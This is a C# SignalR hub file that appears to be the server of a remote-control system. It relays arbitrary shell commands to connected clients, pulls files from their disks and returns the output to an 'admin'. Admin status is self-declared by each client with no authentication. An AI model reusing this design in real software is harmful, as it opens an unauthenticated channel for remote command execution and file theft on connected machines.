using Microsoft.AspNetCore.SignalR;
using Scalax_server;
//using static System.Net.Mime.MediaTypeNames;

namespace ScalaxServer.Hubs;

public class CommunicateHub : Hub
{

    public Task Init(string clientId, string conId, bool isAdmin)
    {

        string prevConsData = File.ReadAllText(CONSTANTS.ACTIVE_CONS_TXTFILE_PATH);
        File.WriteAllText(CONSTANTS.ACTIVE_CONS_TXTFILE_PATH, prevConsData + clientId + ':' + (isAdmin ? $"%{conId}%" : conId) + ';');

        return Task.CompletedTask;
    }



    // # ADMIN ONLY!

    public Task FetchActiveCons(string conId)
    {
        Console.Write("\n\n FETCHED DATA. \n\n");
        string txt = File.ReadAllText(CONSTANTS.ACTIVE_CONS_TXTFILE_PATH.Replace(";", "\n"));
        return Clients.Client(conId).SendAsync("GetActiveCons", txt);
    }

    public Task ExecCmdOnOne (string targetConId, string cmd)
    {
        Console.WriteLine("\n\n Sent command \n\n");
        return Clients.Client(targetConId).SendAsync("ExecCmdOnOne", cmd);
    }


    public Task PullFile(string targetId, string fileType, string filePath, string fileTkn)
    {
        Console.WriteLine($"\n\n Sent PullFile {fileType} Request to ({targetId}) loading the ({filePath}). \n\n");
        File.WriteAllTextAsync(CONSTANTS.ACTIVE_TOKENS_TXTFILE_PATH, fileTkn).Wait();
        return Clients.Client(targetId).SendAsync("PullTheFile", $"{fileType}-{filePath}-{fileTkn}");
    }

    public Task GotPulledFile (bool isFileGotten, string fileName)
    {
        if (isFileGotten)
        {
            File.Delete(Path.Combine(CONSTANTS.WWWROOT_DIR_PATH, fileName));
            File.WriteAllTextAsync(CONSTANTS.ACTIVE_TOKENS_TXTFILE_PATH, string.Empty).Wait();
        };
        return Task.CompletedTask;
    }

    ////
    ///



    public Task SendExecCmdOnOneRes (string conId, string cmdResOutput)
    {
        Console.Write($"\n\n {cmdResOutput} \n\n");

        return Clients.Client(File.ReadAllText(CONSTANTS.ACTIVE_CONS_TXTFILE_PATH).Split(';').ToList().Find(id => id.Contains('%')).Split(':').ElementAt(1).Replace("%", String.Empty)).SendAsync("GetExecCmdOnOneRes", $"{conId} :: \n {cmdResOutput} \n\n");
    }


    public Task SendPulledFileAsDownloadUri(string filePath)
    {
        Console.Write($"Sending notification to admin about file download : \n\n {filePath}");

        return Clients.Client(File.ReadAllText(CONSTANTS.ACTIVE_CONS_TXTFILE_PATH).Split(';').ToList().Find(id => id.Contains('%')).Split(':').ElementAt(1).Replace("%", String.Empty))
                .SendAsync("GetPulledFileAsDownloadUri", $"{CONSTANTS.SERVER_ENDPOINT_URL}/{filePath.Split(@"\").LastOrDefault()}");
    }


}

